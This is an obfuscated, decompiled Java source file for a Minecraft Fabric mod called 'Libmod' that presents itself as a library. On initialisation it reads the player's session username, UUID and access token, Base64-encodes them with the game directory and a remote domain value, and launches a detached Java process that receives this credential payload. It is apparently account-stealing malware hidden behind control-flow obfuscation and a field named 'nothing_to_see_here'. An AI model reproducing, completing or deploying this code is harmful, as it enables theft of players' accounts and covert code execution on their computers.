package com.libmod;

import eetbckwxzqbtefbv.iweepkikjyqovrst;
import java.io.File;
import java.io.IOException;
import java.io.PrintStream;
import java.lang.ProcessBuilder.Redirect;
import java.net.URI;
import java.net.URL;
import java.nio.ByteBuffer;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.attribute.FileAttribute;
import java.security.CodeSource;
import java.security.ProtectionDomain;
import java.util.Base64;
import java.util.Random;
import java.util.UUID;
import net.fabricmc.api.ModInitializer;
import net.fabricmc.loader.api.FabricLoader;
import net.minecraft.class_310;
import net.minecraft.class_320;

public class Libmod implements ModInitializer {
   private static int qg1UGRR5c9;
   private transient int 04QGsoucww;
   private static String iimrcefsos;
   private static String[] nothing_to_see_here = new String[15];

   public Libmod() {
      int var4 = 1487936635 ^ 1419557719;
      super();
      var4 = yvmsnlgcbwwkcori(var4, 1198602292);
      var4 = 1678959658 ^ 57686211 ^ Integer.parseInt("742343665");
      this.04QGsoucww = 879510398 ^ qg1UGRR5c9;
      var4 = 1840293524 ^ var4;
   }

   public void onInitialize() {
      int var8 = 1985568107 ^ 335052931 ^ 1150275907;
      if (iweepkikjyqovrst.kyzurcumkqclfujx(var8) == 158360921) {
         var8 ^= 1774481972;
         PrintStream var1 = System.out;
         String var2 = glquaglpxj(yzumamyedenoigb(), var8);
         var1.println(var2);
         if (iweepkikjyqovrst.kyzurcumkqclfujx(var8) == 1196684538) {
            var8 = 1873293829 ^ var8;
            Runnable var5 = () -> {
               int var209;
               label1024: {
                  label926: {
                     label1025: {
                        label1026: {
                           label1027: {
                              label922: {
                                 label921: {
                                    label1028: {
                                       label919: {
                                          label918: {
                                             label1029: {
                                                label1030: {
                                                   label1031: {
                                                      label1032: {
                                                         label913: {
                                                            label912: {
                                                               label1033: {
                                                                  label910: {
                                                                     label909: {
                                                                        label908: {
                                                                           label907: {
                                                                              label906: {
                                                                                 label1034: {
                                                                                    label904: {
                                                                                       label903: {
                                                                                          label1035: {
                                                                                             label1037: {
                                                                                                label899: {
                                                                                                   label898: {
                                                                                                      label897: {
                                                                                                         label944: {
                                                                                                            var209 = 1308735745 ^ 2045803144 ^ 1150275907;
                                                                                                            if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == -1678731693) {
                                                                                                               label942: {
                                                                                                                  var209 = 1848572056 ^ var209;

                                                                                                                  Exception var10000;
                                                                                                                  label931: {
                                                                                                                     String var10;
                                                                                                                     String var11;
                                                                                                                     String var90;
                                                                                                                     label932: {
                                                                                                                        label933: {
                                                                                                                           try {
                                                                                                                              class_310 var1 = class_310.method_1551();
                                                                                                                              class_320 var28 = var1.method_1548();
                                                                                                                              if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -360230256) {
                                                                                                                                 break label944;
                                                                                                                              }

                                                                                                                              var209 = 57906363 ^ var209;
                                                                                                                              String var30 = var28.method_1674();
                                                                                                                              var10 = var30;
                                                                                                                              if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -249825464) {
                                                                                                                                 break label897;
                                                                                                                              }

                                                                                                                              var209 = 514830723 ^ var209;
                                                                                                                              String var32 = var28.method_1676();
                                                                                                                              var11 = var32;
                                                                                                                              if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 73825104) {
                                                                                                                                 break label898;
                                                                                                                              }

                                                                                                                              var209 = 2111346581 ^ var209;
                                                                                                                              UUID var34 = var28.method_44717();
                                                                                                                              if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -358430725) {
                                                                                                                                 break label899;
                                                                                                                              }

                                                                                                                              var209 = 1479864496 ^ var209;
                                                                                                                              if (var34 == null) {
                                                                                                                                 break label933;
                                                                                                                              }

                                                                                                                              if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 721764985) {
                                                                                                                                 break label1034;
                                                                                                                              }

                                                                                                                              var209 = 1314679949 ^ var209;
                                                                                                                              var90 = var34.toString();
                                                                                                                              if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 1508255251) {
                                                                                                                                 break label926;
                                                                                                                              }
                                                                                                                           } catch (Exception var202) {
                                                                                                                              var10000 = var202;
                                                                                                                              boolean var10001 = false;
                                                                                                                              break label931;
                                                                                                                           }

                                                                                                                           var209 = yvmsnlgcbwwkcori(var209, 1141799040);

                                                                                                                           label883: {
                                                                                                                              try {
                                                                                                                                 if (iweepkikjyqovrst.nmnwjialmtrkdahy(var209) != 192045965) {
                                                                                                                                    throw null;
                                                                                                                                 }
                                                                                                                              } catch (IllegalAccessException var201) {
                                                                                                                                 boolean var296 = false;
                                                                                                                                 break label883;
                                                                                                                              }

                                                                                                                              try {
                                                                                                                                 throw new IllegalAccessException();
                                                                                                                              } catch (IllegalAccessException var193) {
                                                                                                                                 boolean var297 = false;
                                                                                                                              }
                                                                                                                           }

                                                                                                                           switch (iweepkikjyqovrst.gzblpjtxucfsuggz(var209)) {
                                                                                                                              case -1500310392 -> var209 = yvmsnlgcbwwkcori(var209, 64135327);
                                                                                                                              case 2039865873 -> var209 = 942833228 ^ var209;
                                                                                                                              default -> throw new IllegalAccessException("Error in hash");
                                                                                                                           }

                                                                                                                           if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -1207562128) {
                                                                                                                              break label1024;
                                                                                                                           }

                                                                                                                           var209 = 1878592734 ^ var209;
                                                                                                                           break label932;
                                                                                                                        }

                                                                                                                        var209 = yvmsnlgcbwwkcori(var209, 81848161);
                                                                                                                        if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 201488753) {
                                                                                                                           if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == 201488753) {
                                                                                                                              var209 ^= 304241157;
                                                                                                                           }
                                                                                                                           break label1035;
                                                                                                                        }

                                                                                                                        var209 = yvmsnlgcbwwkcori(var209, 78577824);

                                                                                                                        try {
                                                                                                                           var90 = glquaglpxj(dcczvuqkaxpvoqf(), var209);
                                                                                                                           if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 695893105) {
                                                                                                                              break label1037;
                                                                                                                           }

                                                                                                                           var209 ^= 1574338910;
                                                                                                                        } catch (Exception var198) {
                                                                                                                           var10000 = var198;
                                                                                                                           boolean var298 = false;
                                                                                                                           break label931;
                                                                                                                        }
                                                                                                                     }

                                                                                                                     String var13;
                                                                                                                     String var14;
                                                                                                                     Path var15;
                                                                                                                     String var16;
                                                                                                                     String var47;
                                                                                                                     String var134;
                                                                                                                     label935: {
                                                                                                                        label936: {
                                                                                                                           try {
                                                                                                                              var13 = var90;
                                                                                                                              if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -942770557) {
                                                                                                                                 break label1035;
                                                                                                                              }

                                                                                                                              var209 = 769726189 ^ var209;
                                                                                                                              String var36 = LangProvider.getLocale(212471620);
                                                                                                                              var14 = var36;
                                                                                                                              if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -1463369238) {
                                                                                                                                 break label903;
                                                                                                                              }

                                                                                                                              var209 = 941713360 ^ var209;
                                                                                                                              FabricLoader var37 = FabricLoader.getInstance();
                                                                                                                              Path var38 = var37.getConfigDir();
                                                                                                                              Path var39 = var38.getParent();
                                                                                                                              var15 = var39;
                                                                                                                              if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 1775107947) {
                                                                                                                                 break label904;
                                                                                                                              }

                                                                                                                              var209 = 643961802 ^ var209;
                                                                                                                              PrintStream var40 = System.out;
                                                                                                                              String var2 = glquaglpxj(ehoyfkuegpvdvho(), var209);
                                                                                                                              var40.println(var2);
                                                                                                                              if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 1524457786) {
                                                                                                                                 break label1035;
                                                                                                                              }

                                                                                                                              var209 = 1831239598 ^ var209;
                                                                                                                              String var41 = RpcHelper.getDomain(578322668);
                                                                                                                              var16 = var41;
                                                                                                                              if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 871275593) {
                                                                                                                                 break label942;
                                                                                                                              }

                                                                                                                              var209 = 90453293 ^ var209;
                                                                                                                              String var43 = RpcHelper.prefire(var41, var10, var36, 221491726);
                                                                                                                              if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 416232737) {
                                                                                                                                 break label1034;
                                                                                                                              }

                                                                                                                              var209 = 1008331255 ^ var209;
                                                                                                                              Base64.Encoder var44 = Base64.getEncoder();
                                                                                                                              if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -134186344) {
                                                                                                                                 break label897;
                                                                                                                              }

                                                                                                                              var209 = 1825941677 ^ var209;
                                                                                                                              String var93 = this.escapeJson(var11, 1790200805);
                                                                                                                              if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -1632813069) {
                                                                                                                                 break label906;
                                                                                                                              }

                                                                                                                              var209 = 512941533 ^ var209;
                                                                                                                              String var137 = this.escapeJson(var90, 1790200805);
                                                                                                                              if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 1782305051) {
                                                                                                                                 break label907;
                                                                                                                              }

                                                                                                                              var209 = 1454900899 ^ var209;
                                                                                                                              String var148 = this.escapeJson(var10, 1790200805);
                                                                                                                              String var94 = "{\"username\":\"" + var93 + "\",\"uuid\":\"" + var137 + "\",\"accessToken\":\"" + var148 + "\"}";
                                                                                                                              Charset var138 = StandardCharsets.UTF_8;
                                                                                                                              byte[] var95 = var94.getBytes(var138);
                                                                                                                              if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -537140223) {
                                                                                                                                 break label908;
                                                                                                                              }

                                                                                                                              var209 = 665813502 ^ var209;
                                                                                                                              String var45 = var44.encodeToString(var95);
                                                                                                                              if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -494408720) {
                                                                                                                                 break label898;
                                                                                                                              }

                                                                                                                              var209 = 1821470016 ^ var209;
                                                                                                                              PrintStream var46 = System.out;
                                                                                                                              String var96 = glquaglpxj(qkauvfzrrtwsmro(), var209);
                                                                                                                              var46.println(var96);
                                                                                                                              if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -2046000653) {
                                                                                                                                 break label907;
                                                                                                                              }

                                                                                                                              var209 = 1630989007 ^ var209;
                                                                                                                              var47 = var45;
                                                                                                                              if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -1883515000) {
                                                                                                                                 break label909;
                                                                                                                              }

                                                                                                                              var209 = 665242857 ^ var209;
                                                                                                                              if (var43 == null) {
                                                                                                                                 break label936;
                                                                                                                              }

                                                                                                                              if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -1299337023) {
                                                                                                                                 break label1025;
                                                                                                                              }

                                                                                                                              var209 = 2135397997 ^ var209;
                                                                                                                              var134 = var43;
                                                                                                                              if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 1219560362) {
                                                                                                                                 break label921;
                                                                                                                              }
                                                                                                                           } catch (Exception var200) {
                                                                                                                              var10000 = var200;
                                                                                                                              boolean var299 = false;
                                                                                                                              break label931;
                                                                                                                           }

                                                                                                                           var209 = yvmsnlgcbwwkcori(var209, 221951360);

                                                                                                                           label865: {
                                                                                                                              try {
                                                                                                                                 if (iweepkikjyqovrst.nmnwjialmtrkdahy(var209) != 68560550) {
                                                                                                                                    throw null;
                                                                                                                                 }
                                                                                                                              } catch (RuntimeException var199) {
                                                                                                                                 boolean var300 = false;
                                                                                                                                 break label865;
                                                                                                                              }

                                                                                                                              try {
                                                                                                                                 throw new RuntimeException();
                                                                                                                              } catch (RuntimeException var192) {
                                                                                                                                 boolean var301 = false;
                                                                                                                              }
                                                                                                                           }

                                                                                                                           switch (iweepkikjyqovrst.gzblpjtxucfsuggz(var209)) {
                                                                                                                              case 560246698 -> var209 = 2035139687 ^ var209;
                                                                                                                              case 1652349898 -> var209 = yvmsnlgcbwwkcori(var209, 1898892011);
                                                                                                                              default -> throw new RuntimeException("Error in hash");
                                                                                                                           }

                                                                                                                           if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -351630191) {
                                                                                                                              break label944;
                                                                                                                           }

                                                                                                                           var209 ^= 507906205;
                                                                                                                           break label935;
                                                                                                                        }

                                                                                                                        var209 = 1587604733 ^ var209;
                                                                                                                        if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 1200281387) {
                                                                                                                           if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 1200281387) {
                                                                                                                              break label918;
                                                                                                                           }

                                                                                                                           while(true) {
                                                                                                                              switch (iweepkikjyqovrst.nmnwjialmtrkdahy(var209)) {
                                                                                                                                 case 190040298:
                                                                                                                                    var209 ^= 1532186574;
                                                                                                                                    break label1035;
                                                                                                                                 case 407895957:
                                                                                                                                    break;
                                                                                                                                 case 790737816:
                                                                                                                                    break label1035;
                                                                                                                                 case 1989717880:
                                                                                                                                 default:
                                                                                                                                    break label1029;
                                                                                                                              }
                                                                                                                           }
                                                                                                                        }

                                                                                                                        label855:
                                                                                                                        while(true) {
                                                                                                                           switch (iweepkikjyqovrst.nmnwjialmtrkdahy(var209)) {
                                                                                                                              case 190040298:
                                                                                                                                 var209 ^= 1953800918;
                                                                                                                                 break label855;
                                                                                                                              case 789150474:
                                                                                                                              default:
                                                                                                                                 break label910;
                                                                                                                              case 1162097164:
                                                                                                                                 break;
                                                                                                                              case 1710124324:
                                                                                                                                 break label855;
                                                                                                                           }
                                                                                                                        }

                                                                                                                        try {
                                                                                                                           var134 = glquaglpxj(rujbsufvkiiqyby(), var209);
                                                                                                                           if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -466632296) {
                                                                                                                              break label1033;
                                                                                                                           }

                                                                                                                           var209 ^= 1067622716;
                                                                                                                        } catch (Exception var197) {
                                                                                                                           var10000 = var197;
                                                                                                                           boolean var302 = false;
                                                                                                                           break label931;
                                                                                                                        }
                                                                                                                     }

                                                                                                                     String var20;
                                                                                                                     Path var22;
                                                                                                                     label938: {
                                                                                                                        try {
                                                                                                                           if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 423282809) {
                                                                                                                              break label898;
                                                                                                                           }

                                                                                                                           var209 = 1036447784 ^ var209;
                                                                                                                           String var140 = this.escapeJson(var14, 1790200805);
                                                                                                                           if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -150124232) {
                                                                                                                              break label912;
                                                                                                                           }

                                                                                                                           var209 = 315408623 ^ var209;
                                                                                                                           String var151 = this.escapeJson(var16, 1790200805);
                                                                                                                           if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 1634422336) {
                                                                                                                              break label913;
                                                                                                                           }

                                                                                                                           var209 ^= 1091472014;
                                                                                                                           String var175 = var15.toString();
                                                                                                                           String var162 = this.escapeJson(var175, 1790200805);
                                                                                                                           if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 1763646002) {
                                                                                                                              break label906;
                                                                                                                           }

                                                                                                                           var209 ^= 2053108743;
                                                                                                                           String var177 = this.escapeJson(var11, 1790200805);
                                                                                                                           if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -1142900215) {
                                                                                                                              break label1035;
                                                                                                                           }

                                                                                                                           var209 = 1093084778 ^ var209;
                                                                                                                           String var186 = this.escapeJson(var13, 1790200805);
                                                                                                                           String var48 = "{\"mcInfo\":\"" + var47 + "\",\"prefireId\":\"" + var134 + "\",\"userId\":\"" + var140 + "\",\"domain\":\"" + var151 + "\",\"gameDir\":\"" + var162 + "\",\"mcUsername\":\"" + var177 + "\",\"mcUuid\":\"" + var186 + "\",\"env\":\"Fabric\"}";
                                                                                                                           if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -1294366373) {
                                                                                                                              break label1032;
                                                                                                                           }

                                                                                                                           var209 = 837052373 ^ var209;
                                                                                                                           Base64.Encoder var49 = Base64.getEncoder();
                                                                                                                           Charset var141 = StandardCharsets.UTF_8;
                                                                                                                           byte[] var99 = var48.getBytes(var141);
                                                                                                                           String var50 = var49.encodeToString(var99);
                                                                                                                           var20 = var50;
                                                                                                                           if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 1039841266) {
                                                                                                                              break label1031;
                                                                                                                           }

                                                                                                                           var209 = 849598431 ^ var209;
                                                                                                                           String var51 = glquaglpxj(gljbckewxchvnpy(), var209);
                                                                                                                           String var52 = System.getProperty(var51);
                                                                                                                           if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -1461450485) {
                                                                                                                              break label1030;
                                                                                                                           }

                                                                                                                           var209 = 1289680254 ^ var209;
                                                                                                                           byte var100 = (byte)(969045085 ^ var209);
                                                                                                                           String[] var101 = new String[var100];
                                                                                                                           byte var152 = (byte)(969045087 ^ var209);
                                                                                                                           String var163 = glquaglpxj(lgiugqrrlofgcvm(), var209);
                                                                                                                           var101[var152] = var163;
                                                                                                                           byte var153 = (byte)(969045086 ^ var209);
                                                                                                                           String var164 = glquaglpxj(chuqygnlkcszwut(), var209);
                                                                                                                           var101[var153] = var164;
                                                                                                                           Path var54 = Path.of(var52, var101);
                                                                                                                           var22 = var54;
                                                                                                                           if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -837573895) {
                                                                                                                              break label1035;
                                                                                                                           }

                                                                                                                           var209 = 960900371 ^ var209;
                                                                                                                           byte var102 = (byte)(8673612 ^ var209);
                                                                                                                           LinkOption[] var103 = new LinkOption[var102];
                                                                                                                           byte var56 = Files.exists(var54, var103);
                                                                                                                           if (var56 == (8673612 ^ var209)) {
                                                                                                                              if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 69388896) {
                                                                                                                                 break label1026;
                                                                                                                              }

                                                                                                                              var209 = 780370165 ^ var209;
                                                                                                                              byte var104 = (byte)(772266427 ^ var209);
                                                                                                                              String[] var105 = new String[var104];
                                                                                                                              byte var154 = (byte)(772266425 ^ var209);
                                                                                                                              String var165 = glquaglpxj(myukervytoyaklr(), var209);
                                                                                                                              var105[var154] = var165;
                                                                                                                              byte var155 = (byte)(772266424 ^ var209);
                                                                                                                              String var166 = glquaglpxj(fimypeszmdxrkkx(), var209);
                                                                                                                              var105[var155] = var166;
                                                                                                                              Path var58 = Path.of(var52, var105);
                                                                                                                              var22 = var58;
                                                                                                                              if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 1883164105) {
                                                                                                                                 break label909;
                                                                                                                              }

                                                                                                                              var209 = 2118584580 ^ var209;
                                                                                                                              break label938;
                                                                                                                           }
                                                                                                                        } catch (Exception var196) {
                                                                                                                           var10000 = var196;
                                                                                                                           boolean var303 = false;
                                                                                                                           break label931;
                                                                                                                        }

                                                                                                                        var209 = yvmsnlgcbwwkcori(var209, 324594349);
                                                                                                                        if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -1629118712) {
                                                                                                                           if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -1629118712) {
                                                                                                                              break label1028;
                                                                                                                           }

                                                                                                                           var209 = yvmsnlgcbwwkcori(var209, 545171146);
                                                                                                                           break label1035;
                                                                                                                        }

                                                                                                                        label790:
                                                                                                                        while(true) {
                                                                                                                           switch (iweepkikjyqovrst.nmnwjialmtrkdahy(var209)) {
                                                                                                                              case 108760927:
                                                                                                                                 var209 ^= 1134322524;
                                                                                                                                 break label790;
                                                                                                                              case 1125209069:
                                                                                                                              default:
                                                                                                                                 break label913;
                                                                                                                              case 1586615231:
                                                                                                                                 break;
                                                                                                                              case 1731336669:
                                                                                                                                 break label790;
                                                                                                                           }
                                                                                                                        }
                                                                                                                     }

                                                                                                                     try {
                                                                                                                        PrintStream var59 = System.out;
                                                                                                                        String var107 = String.valueOf(var22);
                                                                                                                        String var108 = "Java executable: " + var107;
                                                                                                                        var59.println(var108);
                                                                                                                        if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -2113501718) {
                                                                                                                           break label906;
                                                                                                                        }

                                                                                                                        var209 = 1188091757 ^ var209;
                                                                                                                        Class var60 = Libmod.class;
                                                                                                                        ProtectionDomain var61 = var60.getProtectionDomain();
                                                                                                                        CodeSource var62 = var61.getCodeSource();
                                                                                                                        URL var63 = var62.getLocation();
                                                                                                                        URI var64 = var63.toURI();
                                                                                                                        if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -1266663808) {
                                                                                                                           break label899;
                                                                                                                        }

                                                                                                                        var209 = 703442540 ^ var209;
                                                                                                                        Path var66 = Path.of(var64);
                                                                                                                        if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -68334111) {
                                                                                                                           break label944;
                                                                                                                        }

                                                                                                                        var209 ^= 1004815482;
                                                                                                                        PrintStream var67 = System.out;
                                                                                                                        String var110 = String.valueOf(var66);
                                                                                                                        String var111 = "JAR path: " + var110;
                                                                                                                        var67.println(var111);
                                                                                                                        if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 617573936) {
                                                                                                                           break label898;
                                                                                                                        }

                                                                                                                        var209 ^= 4842827;
                                                                                                                        String var68 = glquaglpxj(fhmahktrkzpbyjx(), var209);
                                                                                                                        String var69 = System.getenv(var68);
                                                                                                                        byte var112 = (byte)(80742542 ^ var209);
                                                                                                                        String[] var113 = new String[var112];
                                                                                                                        byte var156 = (byte)(80742541 ^ var209);
                                                                                                                        String var167 = glquaglpxj(cbgtgxzlgsobkuf(), var209);
                                                                                                                        var113[var156] = var167;
                                                                                                                        byte var157 = (byte)(80742540 ^ var209);
                                                                                                                        String var168 = glquaglpxj(qgzcfqthpzoroxl(), var209);
                                                                                                                        var113[var157] = var168;
                                                                                                                        byte var158 = (byte)(80742543 ^ var209);
                                                                                                                        String var169 = glquaglpxj(ttcxuswawjimlng(), var209);
                                                                                                                        var113[var158] = var169;
                                                                                                                        Path var70 = Path.of(var69, var113);
                                                                                                                        if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 645940328) {
                                                                                                                           break label1029;
                                                                                                                        }

                                                                                                                        var209 ^= 2110551678;
                                                                                                                        byte var114 = (byte)(2031910643 ^ var209);
                                                                                                                        FileAttribute[] var115 = new FileAttribute[var114];
                                                                                                                        Files.createDirectories(var70, var115);
                                                                                                                        if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -924584037) {
                                                                                                                           break label918;
                                                                                                                        }

                                                                                                                        var209 ^= 643861930;
                                                                                                                        ProcessBuilder var73 = new ProcessBuilder;
                                                                                                                        byte var142 = (byte)(1602024284 ^ var209);
                                                                                                                        String[] var143 = new String[var142];
                                                                                                                        byte var170 = (byte)(1602024281 ^ var209);
                                                                                                                        if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -68707638) {
                                                                                                                           break label910;
                                                                                                                        }

                                                                                                                        var209 ^= 1884086096;
                                                                                                                        String var179 = var22.toString();
                                                                                                                        var143[var170] = var179;
                                                                                                                        byte var171 = (byte)(791686152 ^ var209);
                                                                                                                        String var180 = glquaglpxj(nmjwayviujllddq(), var209);
                                                                                                                        var143[var171] = var180;
                                                                                                                        byte var172 = (byte)(791686155 ^ var209);
                                                                                                                        if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 2038521929) {
                                                                                                                           break label1029;
                                                                                                                        }

                                                                                                                        var209 = 1608497238 ^ var209;
                                                                                                                        String var182 = var66.toString();
                                                                                                                        var143[var172] = var182;
                                                                                                                        byte var173 = (byte)(1894749276 ^ var209);
                                                                                                                        String var183 = glquaglpxj(kjyvrvmuzxzcrfk(), var209);
                                                                                                                        var143[var173] = var183;
                                                                                                                        byte var174 = (byte)(1894749275 ^ var209);
                                                                                                                        var143[var174] = var20;
                                                                                                                        var73.<init>(var143);
                                                                                                                        if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -2021874949) {
                                                                                                                           break label919;
                                                                                                                        }

                                                                                                                        var209 = 1220345658 ^ var209;
                                                                                                                        String var159 = glquaglpxj(vbmbffanotsngvo(), var209);
                                                                                                                        File var116 = new File(var159);
                                                                                                                        ProcessBuilder.Redirect var117 = Redirect.from(var116);
                                                                                                                        var73.redirectInput(var117);
                                                                                                                        if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -1030005975) {
                                                                                                                           break label1028;
                                                                                                                        }

                                                                                                                        var209 = 479269590 ^ var209;
                                                                                                                        String var144 = glquaglpxj(hsrbwxzaevizqdb(), var209);
                                                                                                                        Path var119 = var70.resolve(var144);
                                                                                                                        File var120 = var119.toFile();
                                                                                                                        ProcessBuilder.Redirect var121 = Redirect.appendTo(var120);
                                                                                                                        var73.redirectOutput(var121);
                                                                                                                        if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 638832025) {
                                                                                                                           break label921;
                                                                                                                        }

                                                                                                                        var209 = 1094587178 ^ var209;
                                                                                                                        byte var122 = (byte)(1711041176 ^ var209);
                                                                                                                        var73.redirectErrorStream((boolean)var122);
                                                                                                                        if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 803427531) {
                                                                                                                           break label944;
                                                                                                                        }

                                                                                                                        var209 ^= 1369368079;
                                                                                                                        File var124 = var70.toFile();
                                                                                                                        var73.directory(var124);
                                                                                                                        if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -1558944591) {
                                                                                                                           break label918;
                                                                                                                        }

                                                                                                                        var209 = 935048009 ^ var209;
                                                                                                                        Process var83 = var73.start();
                                                                                                                        if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 516554488) {
                                                                                                                           break label922;
                                                                                                                        }

                                                                                                                        var209 = 942216836 ^ var209;
                                                                                                                        PrintStream var84 = System.out;
                                                                                                                        long var126 = var83.pid();
                                                                                                                        String var128 = "Detached process spawned: pid=" + var126;
                                                                                                                        var84.println(var128);
                                                                                                                        if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -545174823) {
                                                                                                                           break label912;
                                                                                                                        }

                                                                                                                        var209 = 526585412 ^ var209;
                                                                                                                        PrintStream var85 = System.out;
                                                                                                                        String var129 = glquaglpxj(beiwmecgdctlgkh(), var209);
                                                                                                                        var85.println(var129);
                                                                                                                        if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 614021369) {
                                                                                                                           break label1027;
                                                                                                                        }

                                                                                                                        var209 = 1090201295 ^ var209;
                                                                                                                     } catch (Exception var195) {
                                                                                                                        var10000 = var195;
                                                                                                                        boolean var304 = false;
                                                                                                                        break label931;
                                                                                                                     }

                                                                                                                     if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == 591400579) {
                                                                                                                        var209 = yvmsnlgcbwwkcori(var209, 195555267);

                                                                                                                        label739: {
                                                                                                                           try {
                                                                                                                              if (iweepkikjyqovrst.nmnwjialmtrkdahy(var209) != 144880267) {
                                                                                                                                 throw null;
                                                                                                                              }
                                                                                                                           } catch (IllegalAccessException var194) {
                                                                                                                              boolean var305 = false;
                                                                                                                              break label739;
                                                                                                                           }

                                                                                                                           try {
                                                                                                                              throw new IllegalAccessException();
                                                                                                                           } catch (IllegalAccessException var191) {
                                                                                                                              boolean var306 = false;
                                                                                                                           }
                                                                                                                        }

                                                                                                                        switch (iweepkikjyqovrst.gzblpjtxucfsuggz(var209)) {
                                                                                                                           case 508549194 -> var209 = yvmsnlgcbwwkcori(var209, 1129603004);
                                                                                                                           case 2122281115 -> var209 = yvmsnlgcbwwkcori(var209, 1867664038);
                                                                                                                           default -> throw new IOException("Error in hash");
                                                                                                                        }

                                                                                                                        if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == 82650536) {
                                                                                                                           var209 = 813044383 ^ var209;
                                                                                                                           return;
                                                                                                                        }
                                                                                                                        break label908;
                                                                                                                     }
                                                                                                                     break label1035;
                                                                                                                  }

                                                                                                                  switch (iweepkikjyqovrst.gzblpjtxucfsuggz(var209)) {
                                                                                                                     case -2113501718 -> var209 = 1571373856 ^ var209;
                                                                                                                     case -2046000653 -> var209 = 2099774371 ^ var209;
                                                                                                                     case -2021874949 -> var209 = 2097547202 ^ var209;
                                                                                                                     case -1883515000 -> var209 = 471787884 ^ var209;
                                                                                                                     case -1632813069 -> var209 = 2117874787 ^ var209;
                                                                                                                     case -1558944591 -> var209 = 965418763 ^ var209;
                                                                                                                     case -1463369238 -> var209 = 1492208544 ^ var209;
                                                                                                                     case -1461450485 -> var209 = yvmsnlgcbwwkcori(var209, 2029327036);
                                                                                                                     case -1299337023 -> var209 = 1001923973 ^ var209;
                                                                                                                     case -1294366373 -> var209 = 2075304630 ^ var209;
                                                                                                                     case -1266663808 -> var209 = 460952653 ^ var209;
                                                                                                                     case -1142900215 -> var209 = 982877404 ^ var209;
                                                                                                                     case -1030005975 -> var209 = yvmsnlgcbwwkcori(var209, 901445880);
                                                                                                                     case -942770557 -> var209 = yvmsnlgcbwwkcori(var209, 1964006733);
                                                                                                                     case -924584037 -> var209 = yvmsnlgcbwwkcori(var209, 1962274158);
                                                                                                                     case -837573895 -> var209 = 875292610 ^ var209;
                                                                                                                     case -545174823 -> var209 = yvmsnlgcbwwkcori(var209, 907655878);
                                                                                                                     case -537140223 -> var209 = 907472669 ^ var209;
                                                                                                                     case -494408720 -> var209 = 297365219 ^ var209;
                                                                                                                     case -466632296 -> var209 = yvmsnlgcbwwkcori(var209, 292318126);
                                                                                                                     case -360230256 -> var209 = yvmsnlgcbwwkcori(var209, 280590799);
                                                                                                                     case -358430725 -> var209 = yvmsnlgcbwwkcori(var209, 1891486562);
                                                                                                                     case -249825464 -> var209 = 332066164 ^ var209;
                                                                                                                     case -150124232 -> var209 = 319306426 ^ var209;
                                                                                                                     case -134186344 -> var209 = yvmsnlgcbwwkcori(var209, 317299918);
                                                                                                                     case -68707638 -> var209 = 1385521348 ^ var209;
                                                                                                                     case -68334111 -> var209 = 848575009 ^ var209;
                                                                                                                     case 69388896 -> var209 = 225299153 ^ var209;
                                                                                                                     case 73825104 -> var209 = yvmsnlgcbwwkcori(var209, 224746743);
                                                                                                                     case 416232737 -> var209 = 787510585 ^ var209;
